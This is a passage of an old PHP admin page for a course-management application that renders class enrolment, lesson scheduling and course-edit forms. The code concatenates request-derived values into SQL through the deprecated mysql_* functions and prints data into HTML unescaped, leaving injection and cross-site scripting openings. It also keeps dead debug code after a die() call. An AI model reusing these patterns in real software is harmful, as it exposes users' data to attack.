        print "<TABLE width=100%><TR>";
        print "<TD ALIGN=CENTER><A HREF='#' onClick=urldelete(\"". FILE_DBQUERY ."?cmd=". FASEDELSTUDENTE ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $key ."&idc=".$selobj."\")><IMG SRC='../img/canc.png' border=0 ALT='"._LBLCANCELLA_."'></A></TD>";
        print "<TD ALIGN=CENTER>";
        if ($cur['dtfine']==0) {print "<A HREF='". FILE_DBQUERY ."?cmd=". FASEREFERSTUDENTE ."&codicepagina=". codiceform(FILE_CORRENTE)  ."&selobj=". $key ."&idc=$selobj'>";}
        if ($cur['frefer']==1) {
          print "<IMG SRC='../img/stella.png' border=0 ALT='"._MSGREFERENTE_."' TITLE='"._MSGREFERENTE_."'>";
        } else {
          print "<IMG SRC='../img/stellagray.png' border=0>";
        }
        print "</A></TD>";
        //$askformhtml = "<FORM ACTION='".FILE_DBQUERY."' METHOD='POST'><INPUT TYPE='text' NAME='cmd' VALUE='".FASEFINESTUDENTE."'><INPUT TYPE='text' NAME='codicepagina' VALUE='".codiceform(FILE_CORRENTE)."'><INPUT TYPE='text' NAME='selobj' VALUE='".$key."'>2<INPUT TYPE='text' NAME='idc' VALUE='$selobj'><INPUT TYPE='text' NAME='datafine' VALUE='".date("d/m/Y",time())."'><INPUT TYPE='text' NAME='note' VALUE=''><INPUT TYPE='submit' NAME='invia' VALUE='invia'>";
        if ($cur['dtfine']==0) {
          print "<TD ALIGN=CENTER><A HREF='#' onClick=finestudente(\"". FILE_DBQUERY ."?cmd=". FASEFINESTUDENTE ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $key ."&idc=$selobj\")><IMG SRC='../img/studentedel.png' border=0 ALT='"._LBLTERMSTUDENTE_."' TITLE='"._LBLTERMSTUDENTE_."'></A></TD>";
        } else {
          print "<TD ALIGN=CENTER><A HREF='". FILE_DBQUERY ."?cmd=". FASERESTORESTUDENTE ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $key ."&idc=$selobj'><IMG SRC='../img/restorestudente.png' border=0 ALT='"._LBLRESTSTUDENTE_."' TITLE='"._LBLRESTSTUDENTE_."'></A></TD>";
        }
        
			print "</TR></TABLE>";
      print "</TD>";
      print "</TR>";
      if ($curstyle==RIGA_DISPARI) {$curstyle=RIGA_PARI;} else {$curstyle=RIGA_DISPARI;}
    }
    print "</TABLE><BR>";
    
    //non iscritti
    $out = "";
    $styleprimo="display: none;";
    
    $out .= "<FORM NAME='studentiNA' METHOD='POST' ACTION='".FILE_DBQUERY."'>";
    $out .= "<INPUT TYPE='hidden' NAME='cmd' VALUE='". $cmd['comando'] ."'><INPUT TYPE='hidden' NAME='selobj' VALUE='". $selobj ."'><INPUT TYPE='hidden' NAME='codicepagina' VALUE='". codiceform(FILE_CORRENTE) ."'>";
    foreach ($studentiNA as $key =>$cur) {
      $selcustomer[$key] = $cur['customer_nome'];
      $out .= "<DIV NAME='stdNA_$key' ID='stdNA_$key' STYLE='$styleprimo'>";
      $out .= "<TABLE align='center' class='inputform' cellpadding='2' cellspacing='0' width='30%'>";
      $out .= "<TR><TD COLSPAN=2 STYLE='text-align:center;'>".$cur['customer_nome']."</TD></TR>";
      $curstyle = RIGA_DISPARI;
      foreach ($cur['studenti'] as $key2 =>$cur2) {
        $out .= "<TR STYLE='background-color:$curstyle;'>";
        $out .= "<TD>".$cur2['studente_nome']."</TD>";
        $out .= "<TD STYLE='width:20%;'><INPUT TYPE='checkbox' NAME='enrollstudenti[]' value='$key2'></TD>";
        $out .= "</TR>";
        if ($curstyle==RIGA_DISPARI) {$curstyle=RIGA_PARI;} else {$curstyle=RIGA_DISPARI;}
      }
      $out .= "</TABLE>";
      $out .= "<BR></DIV>";
    }
    $out .= "</FORM>";
    
    print "<TABLE align='center' class='inputform' cellpadding='2' cellspacing='0' width='50%'>";
    print "<tr><td class='headermod' colspan='3'><div class='header-text'>"._ENROLLSTUD_."</div></td></tr>";
    print "<TR><TD CLASS='form_lbl'>"._LBLAZIENDA_.":</TD>";
    print "<TD><SELECT NAME='selcustomer' SIZE='1' onChange=mostrastudenti(this.value);>";
    foreach ($selcustomer as $keycustomer =>$curcustomer) {
      print "<OPTION VALUE='$keycustomer' ".($keycustomer==$editval['classi_idcustomer'] ? " SELECTED ":"").">$curcustomer</OPTION>";
    }
    print "</SELECT>";
    print "<INPUT TYPE='hidden' NAME='olddiv' id='olddiv' VALUE='".$editval['classi_idcustomer']."'></TD>";
    print "<TD STYLE='width:30%;text-align:center;'><INPUT TYPE='button' NAME='invia' VALUE='"._BTNENTROLLSTUD_."' onClick=studentisubmit();></TD>";
    print "</TR></TABLE>";
    print "<BR>";
    print $out;
    ?>
    <SCRIPT>
      var olddiv = document.getElementById("olddiv");
      bloccoShow = "stdNA_"+olddiv.value;
      var elem = document.getElementById(bloccoShow);
      elem.style.display="block";
    </SCRIPT>
    <?
    
    
  } else {
    //INS o MOD
    if ($cmd['comando']==FASEMOD) {
      $titolofinestra = _MODCLASSEINSEGNAMENTO_; $classtitolo = "headermod";
      //echo "XXX";
    } else {
      $cmd['comando']=FASEINS;
      $titolofinestra = _INSCLASSEINSEGNAMENTO_; $classtitolo = "headerins";
    }
    // Torna all'inserimento
    if ($cmd['comando']!=FASEINS) {
      print "<div align='right' class='backinsert'>";
      print "\t<A HREF='". FILE_CORRENTE ."'><img src='../img/edit_small.gif' align='center' border='0' width='16' height='16'>"._BACKTOINS_."</A>";
      print "</div>";
    }
    print "<BR>";
    
    print "<FORM ACTION='". FILE_DBQUERY ."' METHOD='POST' NAME='caricamento'><INPUT TYPE='hidden' NAME='cmd' VALUE='". $cmd['comando'] ."'><INPUT TYPE='hidden' NAME='selobj' VALUE='". $selobj ."'><INPUT TYPE='hidden' NAME='codicepagina' VALUE='". codiceform(FILE_CORRENTE) ."'>";
  	print "<TABLE align='center' class='inputform' cellpadding='2' cellspacing='0' width='50%'>";
    print "<tr><td class='headermod' colspan='3'><div class='header-text'>$titolofinestra</div></td></tr>";
    
    print "<TR>";
    print "<TD CLASS='form_lbl'>"._DESCRIZIONE_."</TD>";
    print "<TD><INPUT TYPE='text' size='50' NAME='classi_descr' VALUE='". $editval['classi_descr'] ."'></TD>";
    print "<TD CLASS=form_help></TD>";
    print "</TR>";
    
    print "<TR>";
    print "<TD CLASS='form_lbl'>"._LBLAZIENDA_."</TD>";
    print "<TD>";
    $query = "SELECT id, nome FROM customer WHERE trashed<>1 ORDER BY nome";
    $result = mysql_query ($query) or die ("Error_1.2");
    print "<SELECT SIZE=1 NAME='classi_idcustomer'>";
    print "<OPTION VALUE='NULL'>"._MSGNOCUSTOMER_."</OPTION>";
    while ($line=mysql_fetch_assoc($result)) {
      print "<OPTION VALUE='".$line['id']."' ".($editval['classi_idcustomer']==$line['id']? " SELECTED ":"").">".$line['nome']."</OPTION>";
    }
    print "</SELECT></TD>";
    print "<TD CLASS=form_help></TD>";
    print "</TR>";
    
    print "<TR><TD COLSPAN=3 align='center' height='70'><INPUT TYPE='submit' VALUE='"._BTNSALVA_."'>&nbsp;&nbsp;&nbsp;<INPUT TYPE='reset' VALUE='"._BTNRESET_."'></TD></TR>";
    print "</TABLE></FORM>";
  }
  print "<FORM ACTION='".FILE_DBQUERY."' METHOD=POST NAME='dbq_direct'></FORM>";
  include ("finepagina.php");
?>
<SCRIPT>
function studentisubmit() {
  document.studentiNA.submit();
}

function mostrastudenti(curdiv) {
  var olddiv = document.getElementById("olddiv");
  
  bloccoHide = "stdNA_"+olddiv.value;
  bloccoShow = "stdNA_"+curdiv;
  
  var elem = document.getElementById(bloccoHide);
  elem.style.display="none";
  
  var elem = document.getElementById(bloccoShow);
  elem.style.display="block";
  
  olddiv.value=curdiv;
}

function askform1(selobj, idc) {
  alert(selobj);
  alert(idc);
  var datafine = prompt("Data termine iscrizione studente","<?=date("d/m/Y",time())?>");
  alert(datafine); 
}

function finestudente(url) {
  dt = prompt("<?=_MSGDATADELSTUDCLASSE_?>","<?=date("d/m/Y",time())?>");
  risp = confirm("<?=_MSGCONFFINESTUDCLASSE_?>");
  url = url + "&dtf=" + dt;
  if (risp) {
    document.dbq_direct.action=url;
    document.dbq_direct.submit();
  }
}

</SCRIPT>

</body>
</html>
<?  
  
  die("wui");
  
  //myprint_r($editval);
  
  //$cmd['comando']=FASEPREFDAY;
  if ($cmd['comando']==FASEPREFDAY) {
  
    $cmd['comando2'] = $_REQUEST['cmd2'];
    $neprefday=$_REQUEST['prefne'];
    $editval['dataini'] = $_REQUEST['dataini'];
    if ($editval['dataini']=="") {
      $editval['dataini'] = date("d/m/Y");
    }
    
    for ($g=1;$g<=$neprefday;$g++) {
      $chiave = $_REQUEST["wkday_$g"]."-".$_REQUEST["orai_$g"];
      $vetprefday[$chiave]['wkday']=$_REQUEST["wkday_$g"];
      $vetprefday[$chiave]['orai']=$_REQUEST["orai_$g"];
      $vetprefday[$chiave]['oraf']=$_REQUEST["oraf_$g"];
      $vetprefday[$chiave]['iddocente']=$_REQUEST["iddocente_$g"];
      $vetprefday[$chiave]['nickname']=$_REQUEST["iddocente_$g"];
      $vetprefday[$chiave]['prefday_id']=-1;
    }
    
    if ($cmd['comando2']==2) { //ins item da form
      $chiave = $_REQUEST['wkday']."-".$_REQUEST['orai'];
      $vetprefday[$chiave]['wkday']=$_REQUEST['wkday'];
      $vetprefday[$chiave]['orai']=$_REQUEST['orai'];
      $vetprefday[$chiave]['oraf']=$_REQUEST['oraf'];
      $vetprefday[$chiave]['iddocente']=$_REQUEST['iddocente'];
      $vetprefday[$chiave]['nickname']=$_REQUEST['iddocente'];
      $vetprefday[$chiave]['prefday_id']=-1;
      
      $_SESSION['orai'] = $vetprefday[$chiave]['orai'];
      $_SESSION['oraf'] = $vetprefday[$chiave]['oraf'];
    }
    $query = "SELECT prefday.id as prefday_id, prefday.idpstudi as prefday_idpstudi, prefday.wkday as wkday, prefday.orai as orai, prefday.oraf as oraf, prefday.iddocente as prefday_iddocente,
              docente.nickname as nickname
              FROM prefday LEFT JOIN docente ON prefday.iddocente=docente.id AND docente.trashed<>1
              WHERE prefday.idpstudi=".$selobj."
              ORDER BY prefday.wkday, prefday.orai";
    $result = mysql_query($query) or die ("Error_3.3");     
    while ($line = mysql_fetch_assoc($result)) {
      $chiave = $line['wkday']."-".$line['orai'];
      $vetprefday[$chiave]['wkday'] = $line['wkday'];
      $vetprefday[$chiave]['orai']=$line['orai'];
      $vetprefday[$chiave]['oraf']=$line['oraf'];
      $vetprefday[$chiave]['iddocente']=$line['prefday_iddocente'];
      $vetprefday[$chiave]['nickname']=$line['nickname'];
      $vetprefday[$chiave]['prefday_id']=$line['prefday_id'];
    }   
    print "<BR><BR>";
    print "<FORM NAME='prefday' ACTION='".FILE_CORRENTE."' METHOD='POST'>";   
    print "<TABLE CLASS=lista_table ALIGN=CENTER STYLE='width:40%;'>";
    print "<tr><td class='headermod' colspan='5'><div class='header-text'>"._TITOLOPREFDAY_."</div></td></tr>";
    $neprefday=0;
    
    ksort($vetprefday);
    
    $preset['orai'] = $_REQUEST['orai'];
    $preset['oraf'] = $_REQUEST['oraf'];
    
    foreach ($vetprefday as $keypref =>$curpref) {
      $neprefday++;
      
      print "<TR CLASS=lista_riga>";
      print "<TD CLASS=lista_col><INPUT TYPE='hidden' NAME='wkday_".$neprefday."' VALUE='".$curpref['wkday']."'><INPUT TYPE='hidden' NAME='orai_$neprefday' VALUE='".$curpref['orai']."'><INPUT TYPE='hidden' NAME='oraf_".$neprefday."' VALUE='".$curpref['oraf']."'><INPUT TYPE='hidden' NAME='iddocente_$neprefday' VALUE='".$curpref['iddocente']."'>".letter_weekday($curpref['wkday'])."</TD>";
      print "<TD CLASS=lista_col>".date("H:i",$curpref['orai'])."</TD>";
      print "<TD CLASS=lista_col>".date("H:i",$curpref['oraf'])."</TD>";
      print "<TD CLASS=lista_col>".$curpref['nickname']."</TD>";
      print "<TD CLASS=lista_col>".$curpref['prefday_id']."</TD>";
      print "</TR>";
    }
    
    print "<TR CLASS=lista_riga STYLE='background-color:#FFD37A;'>";
    print "<TD CLASS=lista_col STYLE='background-color:#FFD37A;'><SELECT SIZE=1 NAME='wkday'>";
      for ($i=1;$i<7;$i++) {
        print "<OPTION VALUE='$i'>".letter_weekday($i)."</OPTION>";
      }
    print "</SELECT></TD>";
    print "<TD CLASS=lista_col STYLE='background-color:#FFD37A;'><SELECT SIZE=1 NAME='orai' onChange=impostaorafine();>";
      for ($i=$tt_orai;$i<=$tt_oraf;$i+=$tt_step) {
        print "<OPTION VALUE='$i' ".($i == $preset['orai']? " SELECTED ":"").">".date("H:i",$i)."</OPTION>";
      }
    print "</SELECT></TD>";
    print "<TD CLASS=lista_col STYLE='background-color:#FFD37A;'><SELECT SIZE=1 NAME='oraf'>";
      for ($i=$tt_orai;$i<=$tt_oraf;$i+=$tt_step) {
        print "<OPTION VALUE='$i' ".($i == $preset['oraf']? " SELECTED ":"").">".date("H:i",$i)."</OPTION>";
      }
    print "</SELECT></TD>";
    print "<TD CLASS=lista_col STYLE='background-color:#FFD37A;'>";
      if (count($pstudi[$selobj]['insegna']>0)) {
        print "<SELECT SIZE=1 NAME='iddocente'>";
        foreach ($pstudi[$selobj]['insegna'] as $keydocente=>$curdocente) {
          print "<OPTION VALUE='$keydocente'>".$curdocente['nick']."</OPTION>";
        }
        print "</SELECT>";
      } else {
        print _LBLNODOCENTEASS_."<INPUT TYPE='hidden' NAME='iddocente' VALUE='NULL'>";
      }
    print "</TD>";
    
    print "<TD CLASS=lista_col STYLE='background-color:#FFD37A;'><IMG SRC='../img/piu.png' BORDER=0 onClick=prefdayclick();></TD>";
    print "</TR>";
    
    print "</TABLE><BR><BR>";
    print "<TABLE CLASS=lista_table ALIGN=CENTER STYLE='width:40%;'>";
    print "<tr><td class='headermod' colspan='5'><div class='header-text'>"._TITOLOPREFDAY_."</div></td></tr>";
    
    //data
    print "<TR CLASS=lista_riga><TD CLASS=lista_col COLSPAN=5>"._DATAINIZIO_."<INPUT TYPE='text' NAME='dataini' VALUE='".$editval['dataini']."'>&nbsp;<input type=\"button\" value=\""._BRNCALENDARIO_."\" onclick=\"displayCalendar(document.prefday.dataini,'dd/mm/yyyy',this)\">&nbsp;<IMG SRC='../img/update16.png' BORDER=0 onClick=dtiniclick();></TD></TR>";
    print "<TR CLASS=lista_riga><TD CLASS=lista_col COLSPAN=5>"._DATAFINE_."<INPUT TYPE='text' NAME='datafine' VALUE='".$editval['datafine']."'></TD></TR>";
    
    print "</TABLE><BR><BR>";
    
    /*print "<PRE>";
    print_r($vetprefday);
    print "</PRE>";*/
    $dt_dataini = eT_dt2times($editval['dataini']);
    $totore = $editval['pstudi_durata'] * 3600;
    //calcolo
    if (count($vetprefday)>0 && $editval['dataini']!="") {
      
      $wkdini = date("w",$dt_dataini);
      /*
      print "data inserita:".date("d/m/Y",$dt_dataini)."<BR>";
      print "wkd inserito:$wkdini<BR>";
      */
      
      //trova la partenza
      reset($vetprefday);
      $fine=false;
      $trov=false;
      while ($fine==false) {
        $cur = current($vetprefday);
        //print "[$wkdini]-".$cur['wkday']."<BR>";
        if ($wkdini==$cur['wkday']) {
          //print "TROVATO<BR>";
          $fine=true;
          $trov=true;
        } else {
          //print "FALSE<BR>";
          if (next($vetprefday) === false) {
            //print "RESET<BR>";
            reset($vetprefday);
            $fine=true;
          }
        }      
      }
      
      //if ($trov==false) {
        //no trov, sposto data inizio
        $fine=false;
        $salto=0;
        while (!$fine) {
          $cur = current($vetprefday);
          //print "curwk:".$cur['wkday']."<BR>salto:".$salto."WKDINI:$wkdini<BR>";
          if (($cur['wkday']+$salto)>=$wkdini) {
            //print "VERO";
            $fine=true;
          } else {
            //print "FALSO";
            if (next($vetprefday) === false) {
              //print "RESET";
              reset($vetprefday);
              $salto=7;
            }
          }
        }
            
        $app_wk = $cur['wkday'];
        if ($app_wk<$wkdini) {$app_wk += 7;}
        $curdt = $dt_dataini + (($app_wk-$wkdini) * 86400);
        
        
        $fine=false;
        unset($datalezione);
        $ne=0;
        while (!$fine) {
          $cur = current($vetprefday);
          
          $appdur = $cur['oraf']-$cur['orai'];
          if ($totore<$appdur) {$appdur=$totore;}
                  
          $ne++;
          $datalezione[$ne]['dataini']=($curdt+$cur['orai']+3600);
          $datalezione[$ne]['datafine']=$datalezione[$ne]['dataini']+$appdur;
          $datalezione[$ne]['wkday'] = date("w",$datalezione[$ne]['dataini']);
          $datalezione[$ne]['iddocente'] = $cur['iddocente'];
          $datalezione[$ne]['nickname'] = $cur['nickname'];
          
          $totore-=$appdur;
          if ($totore==0){$fine=true;}
          
          if (next($vetprefday) === false) {
              reset($vetprefday);
          }
          $cur = current($vetprefday);
          $app_wk = $cur['wkday'];
          $cur_wk = date("w",$curdt);
          
          /*print "data pre salto:".date("d/m/Y H:i:s",$curdt)."<BR>";
          print "app_wk:".$app_wk."<BR>";
          print "curwk:".$cur_wk."<BR>";*/
          
          if ($app_wk<=$cur_wk || $cur_wk==0) {$app_wk += 7;}
          
          //print "app_wk:".$app_wk."<BR>";
          
          $curdt = eT_dt2times(date("d/m/Y",$curdt));
          $appdtmic = $curdt;
          
          //PROBLEMA IN ALCUNI CASI SI PERDE UN ORA E SBALLA IL CALCOLO
          //SOSTITUTITO CON STRTOTIME
          //$curdt += (($app_wk-$cur_wk) * 86400);
          $curdt = strtotime("+ ".($app_wk-$cur_wk)." day",$curdt);
                    
          /*
          print "<B>data post salto:".date("d/m/Y H:i:s",$curdt)."<BR>";
          
          print "data con strtime".date("d/m/Y H:i:s",strtotime("+ ".($app_wk-$cur_wk)." day",$appdtmic))."<BR></B>";
          */
          

        }
        
        /*print "<PRE>";
        print_r($datalezione);
        print "</PRE>";*/
        
        print "<TABLE CLASS=lista_table ALIGN=CENTER STYLE='width:40%;'>";
        print "<tr><td class='headermod' colspan='5'><div class='header-text'>"._DATECALCOLATE_."</div></td></tr>";
        $g=1;
        foreach ($datalezione as $keylezione =>$curlezione) {
          print "<TR CLASS=lista_riga>";
          print "<TD CLASS=lista_col>
          <INPUT TYPE='hidden' NAME='evtdataini_$g' VALUE='".$curlezione['dataini']."'>
          <INPUT TYPE='hidden' NAME='evtdatafine_$g' VALUE='".$curlezione['datafine']."'>
          <INPUT TYPE='hidden' NAME='evtiddocente_$g' VALUE='".$curlezione['iddocente']."'>
          "._LEZIONENN_.$g." ".letter_weekday($curlezione['wkday'])." ".date("d/m/Y",$curlezione['dataini'])."</TD>";
          print "<TD CLASS=lista_col>".date("H:i",$curlezione['dataini'])."</TD>";
          print "<TD CLASS=lista_col>".date("H:i",$curlezione['datafine'])."</TD>";
          print "<TD CLASS=lista_col>".$curlezione['nickname']."</TD>";
          print "<TD CLASS=lista_col>".$curlezione['prefday_id']."</TD>";
          print "</TR>";
          $ultimogg = $curlezione['dataini'];
          $g++;
        }
    print "<TR CLASS=lista_riga><TD CLASS=lista_col COlSPAN=5>
    <INPUT TYPE='button' NAME='btnsubmit' VALUE='"._BTNCONFEVTESALVA_."' onClick=btnsubclick();></TD></TR>";
    print "</TABLE>";
    print "<SCRIPT>document.prefday.datafine.value=\"".date("d/m/Y",$ultimogg)."\";</SCRIPT>";
    
      //}
      
    }
    
    print "<BR><INPUT TYPE='hidden' NAME='cmd' VALUE='".FASEPREFDAY."'>
      <INPUT TYPE='hidden' NAME='evtne' VALUE='".($g-1)."'>
      <INPUT TYPE='hidden' NAME='compenso' VALUE='".$editval['pstudi_compenso']."'>
      <INPUT TYPE='hidden' NAME='idpstudi' VALUE='".$selobj."'>
      <INPUT TYPE='hidden' NAME='codicepagina' VALUE='".codiceform(FILE_CORRENTE)."_EVT'>
      <INPUT TYPE='hidden' NAME='prefne' VALUE='".$neprefday."'>
      <INPUT TYPE='hidden' NAME='selobj' VALUE='".$selobj."'>
      <INPUT TYPE='hidden' NAME='cmd2' VALUE=''>";
    print "</FORM>";
  }
  
  if ($cmd['comando']==FASECLASSE) {
    print "<TABLE CLASS=lista_table ALIGN=CENTER STYLE='width:60%;'>";
    print "<TR CLASS=lista_riga>";
    
    $tabella = "";
    //studenti in classe
    $query = "SELECT studente.id as studente_id, studente.nome as studente_nome, customer.id as customer_id, customer.nome as customer_nome,
              classe.datai as classe_datai
              FROM classe INNER JOIN studente ON classe.idstudente=studente.id
              LEFT JOIN customer ON studente.idcustomer=customer.id
              WHERE studente.trashed<>1 AND (customer.trashed<>1 OR customer.trashed IS NULL) AND classe.dataf=1 AND classe.idpstudi=".$selobj."
              ORDER BY customer.nome, studente.nome";
    $result = mysql_query($query) or die ("Error_3.1");
    $idstud = "-1, ";
    while ($line = mysql_fetch_assoc($result)) {
      $tabella.= "<TR><TD CLASS=lista_col><IMG SRC='../img/prev.png' BORDER=0 onClick=modclasse(".$line['studente_id'].",".$selobj.",".$line['classe_datai'].",2);></TD><TD CLASS=lista_col>".$line['studente_nome']." (".$line['customer_nome'].")</TD></TR>";
      $idstud .= $line['studente_id'].", ";
    }
    
    $idstud = substr($idstud,0,-2);
    //studenti non in classe
    $query = "SELECT studente.id as studente_id, studente.nome as studente_nome, customer.id as customer_id, customer.nome as customer_nome
              FROM studente LEFT JOIN customer ON studente.idcustomer=customer.id
              WHERE studente.trashed<>1 AND (customer.trashed<>1 OR customer.trashed IS NULL) AND studente.id NOT IN (".$idstud.")
              ORDER BY customer.nome, studente.nome";
    $result = mysql_query($query) or die ("Error_3.2");
    
    print "<TD WIDTH=50% STYLE='vertical-align: top;'><TABLE WIDTH=100%>";
    print "<TR><TD COLSPAN=2 CLASS=lista_tittab>"._NOISCRITTI_."</TD></TR>";
    while ($line = mysql_fetch_assoc($result)) {
      print "<TR><TD CLASS=lista_col >".$line['studente_nome']." (".$line['customer_nome'].")</TD><TD CLASS=lista_col ><IMG SRC='../img/next.png' BORDER=0 onClick=modclasse(".$line['studente_id'].",".$selobj.",0,1);></TD></TR>";
    }
    print "</TABLE></TD>";
    print "<TD WIDTH=50% STYLE='vertical-align: top;'><TABLE WIDTH=100%><TR><TD COLSPAN=2 CLASS=lista_tittab>"._BTNISCRITTI_."</TD></TR>".$tabella."</TABLE></TD>";
    print "</TR></TABLE>";
    
  } else {
  
    if ($cmd['comando']!=FASECLASSE && $cmd['comando']!=FASEPREFDAY) {
      if ($cmd['comando']==FASEMOD) {
          $titolofinestra = _MODCLASSEINSEGNAMENTO_; $classtitolo = "headermod";
          //echo "XXX";
      } else {
          $cmd['comando']=FASEINS;
          $titolofinestra = _INSCLASSEINSEGNAMENTO_; $classtitolo = "headerins";
          //echo "<BR> xxcmd ".$cmd;
      }
    }
    
    // Torna all'inserimento
    if ($cmd['comando']!=FASEINS) {
      print "<div align='right' class='backinsert'>";
      print "\t<A HREF='". FILE_CORRENTE ."'><img src='../img/edit_small.gif' align='center' border='0' width='16' height='16'>"._BACKTOINS_."</A>";
      print "</div>";
    }
    print "<BR>";
    
    
    
    if ($cmd['comando']==FASEMOD || $cmd['comando']==FASEINS) {    
      print "<FORM ACTION='". FILE_DBQUERY ."' METHOD='POST' NAME='caricamento'><INPUT TYPE='hidden' NAME='cmd' VALUE='". $cmd['comando'] ."'><INPUT TYPE='hidden' NAME='selobj' VALUE='". $selobj ."'><INPUT TYPE='hidden' NAME='codicepagina' VALUE='". codiceform(FILE_CORRENTE) ."'>";
    	print "<TABLE align='center' class='inputform' cellpadding='2' cellspacing='0' width='50%'>";
      print "<tr><td class='headermod' colspan='3'><div class='header-text'>$titolofinestra</div></td></tr>";
      
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._DESCRIZIONE_."</TD>";
      print "<TD><INPUT TYPE='text' size='50' NAME='descr' VALUE='". $editval['pstudi_descr'] ."'></TD>";
      print "<TD CLASS=form_help></TD>";
      print "</TR>";
      
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._CODLIVCORSO_."</TD>";
      print "<TD>";
      $query = "SELECT id, descr, codlivello FROM corso WHERE trashed<>1 ORDER BY codlivello";
      $result = mysql_query ($query) or die ("Error_1.2");
      print "<SELECT SIZE=1 NAME='idcorso'>";
      while ($line=mysql_fetch_assoc($result)) {
        print "<OPTION VALUE='".$line['id']."' ".($editval['pstudi_idcorso']==$line['id']? " SELECTED ":"").">".$line['descr']."</OPTION>";
      }
      print "</SELECT></TD>";
      print "<TD CLASS=form_help></TD>";
      print "</TR>";
      
      /*
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._DATAINIZIO_."</TD>";
      print "<TD><INPUT TYPE='text' size='50' NAME='datai' VALUE='". $editval['pstudi_datai'] ."'></TD>";
      print "<TD CLASS=form_help></TD>";
      print "</TR>";
      
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._DATAFINE_."</TD>";
      print "<TD><INPUT TYPE='text' size='50' NAME='dataf' VALUE='". $editval['pstudi_dataf'] ."'></TD>";
      print "<TD CLASS=form_help></TD>";
      print "</TR>";
      */
      
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._DURATATOTALE_."</TD>";
      print "<TD><INPUT TYPE='text' size='20' NAME='durata' VALUE='". $editval['pstudi_durata'] ."'>
        <INPUT TYPE='button' NAME='durata20' VALUE=' 20 ' onClick=document.caricamento.durata.value=20;>&nbsp;
        <INPUT TYPE='button' NAME='durata40' VALUE=' 40 ' onClick=document.caricamento.durata.value=40;>&nbsp;
        <INPUT TYPE='button' NAME='durata60' VALUE=' 60 ' onClick=document.caricamento.durata.value=60;>&nbsp;
        <INPUT TYPE='button' NAME='durata120' VALUE=' 120 ' onClick=document.caricamento.durata.value=120;>&nbsp;
      </TD>";
      print "<TD CLASS=form_help></TD>";
      print "</TR>";
      
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._DURATALEZIONE_."</TD>";
      print "<TD>";
        $appdlezione = mktime(0, 0, 0, 1, 1, 2010);
        print "<SELECT NAME='dlezione' SIZE='1'>";
        for ($n=1;$n<=10;$n++) {
          $curdlezione = $n * 30;
          print "<OPTION VALUE='".$curdlezione."' ".($curdlezione == $editval['pstudi_dlezione']? " SELECTED ":"").">".date("H:i",$appdlezione + ($curdlezione * 60))."</OPTION>";
        }
        print "</SELECT>";
      //<INPUT TYPE='text' size='50' NAME='dlezione' VALUE='". $editval['pstudi_dlezione'] ."'>
      print "</TD>";
      print "<TD CLASS=form_help></TD>";
      print "</TR>";
      
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._COMPENSO_."</TD>";
      print "<TD><INPUT TYPE='text' size='50' NAME='compenso' VALUE='". $editval['pstudi_compenso'] ."'></TD>";
      print "<TD CLASS=form_help></TD>";
      print "</TR>";
      
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._LBLSENSE_."</TD>";
      print "<TD><INPUT TYPE='text' size='50' NAME='codsense' VALUE='". $editval['pstudi_codsense'] ."'></TD>";
      print "<TD CLASS=form_help></TD>";
      print "</TR>";
      
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._LBLOTEC_."</TD>";
      print "<TD><INPUT TYPE='text' size='50' NAME='codotec' VALUE='". $editval['pstudi_codotec'] ."'></TD>";
      print "<TD CLASS=form_help></TD>";
      print "</TR>";
      
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._ATTIVITA_."</TD>";
      print "<TD><TEXTAREA NAME='attivita' COLS='50' ROWS='3'>". $editval['pstudi_attivita'] ."</TEXTAREA></TD>";
      print "<TD CLASS=form_help></TD>";
      print "</TR>";
      
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._LUOGO_."</TD>";
      print "<TD><TEXTAREA NAME='luogo' COLS='50' ROWS='3'>". $editval['pstudi_luogo'] ."</TEXTAREA></TD>";
      print "<TD CLASS=form_help></TD>";
      print "</TR>";
      
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._LBLCOLORE_."</TD>";
      print "<TD><INPUT class=\"color {valueElement:'styleValue'}\" size=\"50\" NAME=\"style\" id=\"style\"><INPUT TYPE=\"hidden\" id=\"styleValue\" name=\"styleValue\" VALUE=\"".($cmd['comando']==FASEMOD ? $editval['pstudi_style'] : "FFFFFF")."\"></TD>";
      print "<TD CLASS=form_help></TD>";
      print "</TR>";
      
      print "<TR>";
      print "<TD CLASS='form_lbl'>"._LBLDOCENTI_."</TD>";
      print "<TD>";
        print "<TABLE>";
        $docass="-1, ";
        if (count($pstudi[$selobj]['insegna'])>0) {
          foreach ($pstudi[$selobj]['insegna'] as $keyinsegna=>$curinsegna) {
            print "<TR><TD>".$curinsegna['nick']."</TD><TD><A HREF='".FILE_DBQUERY."?cmd=".FASEREMDOCENTE."&codicepagina=".codiceform(FILE_CORRENTE)."&idpstudi=$selobj&iddocente=$keyinsegna'><IMG SRC='../img/canc.png' BORDER=0></A></TD></TR>";
            $docass .= "$keyinsegna, ";
          }      
        } else {
          print _LBLNODOCENTEASS_;
        }
        $docass = substr($docass, 0, -2);
        $query = "SELECT id, nickname FROM docente WHERE trashed<>1 AND attivo=1 AND id NOT IN (".$docass.") ORDER BY nickname";
        $result = mysql_query ($query) or die ("Error_1.3");
        print "<TR><TD><SELECT SIZE=1 NAME='iddocente'>";
        if ($cmd['comando']==FASEINS) {print "<OPTION VALUE=''>- - - - -</OPTION>";}
        while ($line=mysql_fetch_assoc($result)) {
          print "<OPTION VALUE='".$line['id']."'>".$line['nickname']."</OPTION>";
        }
        print "</SELECT></TD><TD>".($cmd['comando']==FASEINS ? "": "<IMG SRC='../img/piu.png' BORDER=0 onClick=insegna();>")."</TD>";
        print "</TABLE></TD></TR>";
      
      
      
      print "<TR><TD COLSPAN=3 align='center' height='70'><INPUT TYPE='submit' VALUE='"._BTNSALVA_."'>&nbsp;&nbsp;&nbsp;<INPUT TYPE='reset' VALUE='"._BTNRESET_."'></TD></TR>";
      /*if ($cmd['comando']==FASEINS) {
